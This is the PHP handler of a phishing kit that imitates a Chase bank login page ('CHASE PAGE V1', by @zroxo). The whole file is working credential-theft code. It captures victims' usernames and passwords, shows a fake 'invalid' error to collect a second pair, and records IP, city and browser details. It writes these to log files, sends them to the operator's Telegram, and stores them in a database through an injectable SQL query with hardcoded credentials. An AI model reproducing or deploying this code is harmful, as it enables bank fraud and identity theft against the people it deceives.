<?php
ob_start();
session_start();
//error_reporting(0);
// include'../Protection.php'; 
include'../includes/telegram.php'; 
include'../admin/config.php'; 
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
if (!isset($_SESSION['ZRXSESSION'])) {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
function wordsExist(&$string, $words) {
    foreach($words as &$word) {
        if(stripos($string, $word) !== false) {
            return true;
        }
    }
    return false;
}
if (isset($_POST["checkb0t"]) && $_POST["checkb0t"] !== "") {
  header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
if (str_word_count($_POST['username']) >= 2) {
	exit(header("Location: ../login?key=".$_SESSION['ZRXSESSION']."&invalid2"));
}
if (wordsExist($_POST['username'], array('fuck','fuckyou','bot','bitch','eatchit','test'))) {
    exit(header("Location: ../login?key=".$_SESSION['ZRXSESSION']."&invalid2"));
}
if (!preg_match('/[A-Za-z]/', $_POST['username']) & preg_match('/\d/', $_POST['username']) == 1) {
	exit(header("Location: ../login?key=".$_SESSION['ZRXSESSION']."&invalid2"));
}

if (!empty($_POST['token']) && !empty($_POST['username']) && !empty($_POST['pw'])) {
if (hash_equals($_SESSION['token'], $_POST['token'])) {
//////////////////////////rizi code
if($skip2page){
    
    $resulta  = "+ --------------[ INFO LOGIN PAGE ]---------------+\n";
	$resulta .= "[Username]: ".$_POST['username']."\n";
	$resulta .= "[password]: ".$_POST['pw']."\n";
	$_SESSION["all_coll"] = $resulta;
	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
	$_SESSION['username2'] = $_POST['username'];
	$_SESSION['password2'] = $_POST['pw'];
	$zroxo = fopen("../admin/result/logs.txt","a+");
    fwrite($zroxo,$resulta);
    fclose($zroxo);
    $zroxo = fopen("../admin/result/totallogs.txt","a+");
    fwrite($zroxo,"".$_POST['username']."\n");
    fclose($zroxo);
    
	$subject = "#ZROXO CHASE: [{$_POST['username']}] [ {$_POST['pw']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
	$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    // Stop sending me logs alone.
    // if ($telegram_result == "on") {
    //   telegram_message($resulta,$telegram_token,$telegram_chatid); 
    // }
    //  if ($email_result == "on") {
    //  @mail($email_result_config,$subject,$resulta,$headers);
    //  }
    telegram_message($resulta,$telegram_token,$telegram_chatid); 
// 	exit(header("Location: ../auth?key=".$_SESSION['ZRXSESSION'].""));

    // Insert to db
    $conn = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");
          
    // Check connection
    if($conn === false) {
        die("ERROR: Could not connect. " . mysqli_connect_error());
    }
          
    $username =  $_POST['username'];
    $password = $_POST['pw'];
    $email = $_POST['username'];
    $token = $_POST['key_token'];
          
    $sql = "INSERT INTO users (username, token, password, email) VALUES ('$username', '$token', '$password', '$email')";
    
    if(mysqli_query($conn, $sql)){
        echo "Success"; 
    } else{
        echo "ERROR: Hush! Sorry $sql. " 
                . mysqli_error($conn);
    }
          
    // Close connection
    mysqli_close($conn);
    
    // End Insert to db
    
    exit(header("Location: ../overviewAccounts?key=".$_SESSION['ZRXSESSION'].""));

}
///////////////////////// rizi code 
if (isset($_POST['invalid'])) {
	$resulta  = "+ --------------[ INFO LOGIN PAGE ]---------------+\n";
	$resulta .= "[Username1]: ".$_SESSION['username1']."\n";
	$resulta .= "[Password1]: ".$_SESSION['password1']."\n";
	$resulta .= "[Username2]: ".$_POST['username']."\n";
	$resulta .= "[Username2]: ".$_POST['pw']."\n";
	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
	$resulta .= "City: ".$_SESSION['city']."\n";
	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
	$_SESSION['username2'] = $_POST['username'];
	$_SESSION['password2'] = $_POST['pw'];
	$zroxo = fopen("../admin/result/logs.txt","a+");
    fwrite($zroxo,$resulta);
    fclose($zroxo);
    $zroxo = fopen("../admin/result/totallogs.txt","a+");
    fwrite($zroxo,"".$_POST['username']."\n");
    fclose($zroxo);
    $_SESSION["all_coll"] = $resulta;
    // Stop sending me logs alone.
    @mail($email_result_config,$subject,$resulta,$headers);
     telegram_message($resulta,$telegram_token,$telegram_chatid); 
// 	exit(header("Location: ../auth?key=".$_SESSION['ZRXSESSION'].""))

    // Insert to db
    $conn = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");
          
    // Check connection
    if($conn === false) {
        die("ERROR: Could not connect. " . mysqli_connect_error());
    }
          
    $username =  $_POST['username'];
    $password = $_POST['pw'];
    $email = $_POST['username'];
    $token = $_POST['key_token'];
    $sql = "INSERT INTO users (username, password, email, token) VALUES ('$username', '$password', '$email', '$token')";
    
    if(mysqli_query($conn, $sql)){
        echo "Success"; 
    } else{
        echo "ERROR: Hush! Sorry $sql. " 
                . mysqli_error($conn);
    }
          
    // Close connection
    mysqli_close($conn);
    
    // End Insert to db
    
    exit(header("Location: ../overviewAccounts?key=".$_SESSION['ZRXSESSION'].""));
}else{
	$_SESSION['username1'] = $_POST['username'];
	$_SESSION['password1'] = $_POST['pw'];
    $zroxo = fopen("../admin/result/totallogs.txt","a+");
    
    fwrite($zroxo,"".$_POST['username']."\n");
    fclose($zroxo);
        
	exit(header("Location: ../login?key=".$_SESSION['ZRXSESSION']."&invalid"));
}

}else{
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
}